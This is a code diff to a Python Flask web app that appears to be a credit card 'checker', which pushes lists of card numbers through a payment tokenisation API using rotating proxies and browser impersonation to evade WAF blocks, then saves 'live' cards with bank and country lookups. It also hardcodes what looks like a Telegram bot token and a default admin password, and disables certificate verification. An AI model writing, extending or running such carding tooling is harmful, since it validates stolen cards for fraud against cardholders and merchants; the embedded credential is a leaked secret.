@@ -1,6 +1,4 @@
 import os
-import io
-import csv
 import json
 import random
 import string
@@ -30,7 +28,6 @@ app = Flask(__name__)
 DB_FILE = 'keys.json'
 CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
-BIN_CACHE_FILE = 'bin_cache.json'
 
 DEFAULT_ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
@@ -40,160 +37,6 @@ IDLE_PAUSE_THRESHOLD = 20
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 db_lock = threading.Lock()
-bin_lock = threading.Lock()
-bin_server_cache = {}
-OFFLINE_BIN_LOADED = False
-
-def country_code_to_flag(iso2):
-    if not iso2 or len(iso2) != 2 or not iso2.isalpha():
-        return "🌐"
-    return "".join(chr(0x1F1E6 + ord(c.upper()) - ord('A')) for c in iso2)
-
-def load_local_bin_cache():
-    if os.path.exists(BIN_CACHE_FILE):
-        try:
-            with open(BIN_CACHE_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-                if isinstance(data, dict):
-                    bin_server_cache.update(data)
-        except Exception:
-            pass
-
-def save_local_bin_entry(bin_code, res_obj):
-    with bin_lock:
-        bin_server_cache[bin_code] = res_obj
-        try:
-            local_saved = {}
-            if os.path.exists(BIN_CACHE_FILE):
-                with open(BIN_CACHE_FILE, 'r', encoding='utf-8') as f:
-                    local_saved = json.load(f)
-            local_saved[bin_code] = res_obj
-            with open(BIN_CACHE_FILE, 'w', encoding='utf-8') as f:
-                json.dump(local_saved, f, indent=2)
-        except Exception:
-            pass
-
-def preload_offline_bins():
-    global OFFLINE_BIN_LOADED
-    if OFFLINE_BIN_LOADED:
-        return
-    OFFLINE_BIN_LOADED = True
-    load_local_bin_cache()
-    csv_url = "https://raw.githubusercontent.com/venelinkochev/bin-list-data/master/bin-list-data.csv"
-    try:
-        r = requests.get(csv_url, timeout=15)
-        if r.status_code == 200:
-            reader = csv.DictReader(io.StringIO(r.text))
-            for row in reader:
-                b = (row.get("BIN") or "").strip()[:6]
-                if len(b) == 6 and b not in bin_server_cache:
-                    scheme = (row.get("Brand") or "VISA/MC").strip().upper()
-                    c_type = (row.get("Type") or "CREDIT").strip().upper()
-                    issuer = (row.get("Issuer") or "Issuer Not Listed").strip()
-                    country = (row.get("CountryName") or "Unknown").strip()
-                    iso2 = (row.get("isoCode2") or "").strip()
-                    flag = country_code_to_flag(iso2)
-                    bin_server_cache[b] = {
-                        "success": True,
-                        "scheme": scheme,
-                        "type": c_type,
-                        "country": f"{flag} {country}".strip(),
-                        "bank": issuer
-                    }
-    except Exception:
-        pass
-
-threading.Thread(target=preload_offline_bins, daemon=True).start()
-
-def resolve_bin_info(bin_code):
-    bin_code = "".join(filter(str.isdigit, str(bin_code)))[:6]
-    if len(bin_code) < 6:
-        return {
-            "success": False,
-            "scheme": "UNKNOWN",
-            "type": "CARD",
-            "country": "🌐 Unknown",
-            "bank": "Unknown Bank"
-        }
-
-    if bin_code in bin_server_cache:
-        return bin_server_cache[bin_code]
-
-    try:
-        r1 = requests.get(f"https://data.handyapi.com/bin/{bin_code}", timeout=4)
-        if r1.status_code == 200:
-            d1 = r1.json()
-            if d1.get("Status") == "SUCCESS":
-                c_info = d1.get("Country") or {}
-                flag = country_code_to_flag(c_info.get("A2", ""))
-                bank = (d1.get("Issuer") or "").strip() or "Issuer Not Listed"
-                country = (c_info.get("Name") or "").strip() or "Unknown"
-                res_obj = {
-                    "success": True,
-                    "scheme": (d1.get("Scheme") or "VISA/MC").upper(),
-                    "type": (d1.get("Type") or "CREDIT").upper(),
-                    "country": f"{flag} {country}".strip(),
-                    "bank": bank
-                }
-                save_local_bin_entry(bin_code, res_obj)
-                return res_obj
-    except Exception:
-        pass
-
-    try:
-        r2 = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=4)
-        if r2.status_code == 200:
-            d2 = r2.json()
-            if d2 and (d2.get("scheme") or d2.get("country")):
-                c_obj = d2.get("country") or {}
-                b_obj = d2.get("bank") or {}
-                bank = (b_obj.get("name") or "").strip() or "Issuer Not Listed"
-                country = (c_obj.get("name") or "").strip() or "Unknown"
-                emoji = c_obj.get("emoji") or country_code_to_flag(c_obj.get("alpha2", ""))
-                res_obj = {
-                    "success": True,
-                    "scheme": (d2.get("scheme") or "VISA/MC").upper(),
-                    "type": (d2.get("type") or "CREDIT").upper(),
-                    "country": f"{emoji} {country}".strip(),
-                    "bank": bank
-                }
-                save_local_bin_entry(bin_code, res_obj)
-                return res_obj
-    except Exception:
-        pass
-
-    try:
-        r3 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=4)
-        if r3.status_code == 200:
-            d3 = r3.json()
-            b_info = d3.get("bank") or {}
-            c_info = d3.get("country") or {}
-            if d3.get("scheme") or c_info.get("name"):
-                emoji = c_info.get("emoji") or country_code_to_flag(c_info.get("alpha2", ""))
-                res_obj = {
-                    "success": True,
-                    "scheme": (d3.get("scheme") or "VISA/MC").upper(),
-                    "type": (d3.get("type") or "CREDIT").upper(),
-                    "country": f"{emoji} {c_info.get('name', 'Unknown')}".strip(),
-                    "bank": (b_info.get("name") or "").strip() or "Issuer Not Listed"
-                }
-                save_local_bin_entry(bin_code, res_obj)
-                return res_obj
-    except Exception:
-        pass
-
-    default_scheme = "VISA" if bin_code.startswith("4") else (
-        "MASTERCARD" if bin_code.startswith(("5", "2")) else (
-            "AMEX" if bin_code.startswith("3") else "VISA/MC"
-        )
-    )
-    return {
-        "success": False,
-        "scheme": default_scheme,
-        "type": "CARD",
-        "country": "🌐 Unknown Country",
-        "bank": "🏦 Unknown Bank"
-    }
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
@@ -417,7 +260,43 @@ def handle_config():
 
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
-    return jsonify(resolve_bin_info(bin_code))
+    bin_code = bin_code.strip()[:6]
+    try:
+        r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            if data and data.get("success"):
+                bank_name = data.get("bank", {}).get("name")
+                country_name = data.get('country', {}).get('name')
+                if bank_name and country_name:
+                    return jsonify({
+                        "success": True,
+                        "scheme": (data.get("scheme") or "UNKNOWN").upper(),
+                        "type": (data.get("type") or "").upper(),
+                        "country": f"{data.get('country', {}).get('emoji', '')} {country_name}",
+                        "bank": bank_name
+                    })
+    except Exception:
+        pass
+
+    try:
+        r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=5)
+        if r2.status_code == 200:
+            data2 = r2.json()
+            bank_info = data2.get("bank", {})
+            country_info = data2.get("country", {})
+            if bank_info.get("name") and country_info.get("name"):
+                return jsonify({
+                    "success": True,
+                    "scheme": (data2.get("scheme") or "UNKNOWN").upper(),
+                    "type": (data2.get("type") or "").upper(),
+                    "country": f"{country_info.get('emoji', '')} {country_info.get('name', 'Unknown')}",
+                    "bank": bank_info.get("name", "Unknown Bank")
+                })
+    except Exception:
+        pass
+
+    return jsonify({"success": False, "scheme": "VISA/MC", "type": "CREDIT", "country": "🌐 Unknown Country", "bank": "🏦 Unknown Bank"})
 
 @app.route('/api/keys', methods=['GET', 'POST'])
 def handle_keys():
@@ -614,6 +493,10 @@ class WebProxyPool:
         return {"http": p, "https": p}
 
 class DynamicTokenManager:
+    """
+    EXACT ORIGINAL TOKEN FLOW PERO WALANG DEADLOCK:
+    Kumukuha ng fresh token gamit ang sariling session nang hindi bina-block ang ibang threads.
+    """
     def __init__(self, initial_token, proxy_pool):
         self.token = initial_token
         self.proxy_pool = proxy_pool
@@ -633,7 +516,7 @@ class DynamicTokenManager:
             proxy_str = p_dict["http"] if p_dict else None
         try:
             req_session = session if session else cffi_requests.Session(impersonate="chrome")
-            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=8, verify=False)
+            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("access_token")
@@ -646,7 +529,7 @@ class DynamicTokenManager:
 
 def test_proxy(proxy_dict):
     try:
-        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=4, verify=False)
+        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
         return r.status_code == 200
     except Exception:
         return False
@@ -735,11 +618,11 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
             headers=headers, 
             proxy=proxy_str,
-            timeout=8,
+            timeout=10,
             verify=False
         )
         if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)"
+            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
         
         keys = r.json().get("list", [])
         if not keys:
@@ -765,7 +648,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
                 "save_card": False
             },
             proxy=proxy_str,
-            timeout=8,
+            timeout=10,
             verify=False
         )
         
@@ -786,7 +669,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
             headers=headers,
             proxy=proxy_str,
-            timeout=8,
+            timeout=10,
             verify=False
         )
         
@@ -806,7 +689,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
 
     except Exception as e:
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
-        return 2, "ERROR", err_msg[:50] or "Timeout"
+        return 2, "ERROR", err_msg or "Exception"
     finally:
         try:
             session.close()
@@ -835,7 +718,7 @@ def background_worker(cards, proxies_list, max_threads):
                 valid_proxies.append(p_str)
         
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
-        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)} active. Starting..."})
+        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
     else:
         proxy_pool = None
         checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
@@ -849,14 +732,26 @@ def background_worker(cards, proxies_list, max_threads):
             return
         
         code, status, detail = check_single_card(card, proxy_pool, token_manager)
-        bin_code = card.split("|")[0].strip()[:6]
-        bin_meta = resolve_bin_info(bin_code)
         
         with counts_lock:
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
+                bin_code = card.split("|")[0].strip()[:6]
+                bin_meta = {}
+                try:
+                    b_res = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3).json()
+                    if b_res and b_res.get("success"):
+                        bin_meta = {
+                            "scheme": (b_res.get("scheme") or "VISA/MC").upper(),
+                            "type": (b_res.get("type") or "CREDIT").upper(),
+                            "bank": b_res.get("bank", {}).get("name", "Unknown Bank"),
+                            "country": f"{b_res.get('country', {}).get('emoji', '')} {b_res.get('country', {}).get('name', 'Unknown')}"
+                        }
+                except Exception:
+                    pass
                 save_live_card(card, detail, bin_meta)
+
             elif code == 1:
                 counts["dead"] += 1
             else:
@@ -867,13 +762,12 @@ def background_worker(cards, proxies_list, max_threads):
                 "status": status,
                 "code": code,
                 "detail": detail,
-                "bin_info": bin_meta,
                 **counts
             })
 
-    with ThreadPoolExecutor(max_workers=max(1, int(max_threads))) as executor:
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [executor.submit(worker_task, card) for card in cards]
-        for future in as_completed(futures):
+        for _ in as_completed(futures):
             if checker_stop_event.is_set():
                 break
 
@@ -913,6 +807,10 @@ def api_checker_stop():
 
 @app.route('/api/checker/poll')
 def api_checker_poll():
+    """
+    NON-BLOCKING BATCH POLL ENDPOINT:
+    Kumukuha ng lahat ng available card results sa queue sa isang iglap nang hindi bina-block ang Gunicorn worker.
+    """
     items = []
     while not checker_queue.empty() and len(items) < 50:
         try:
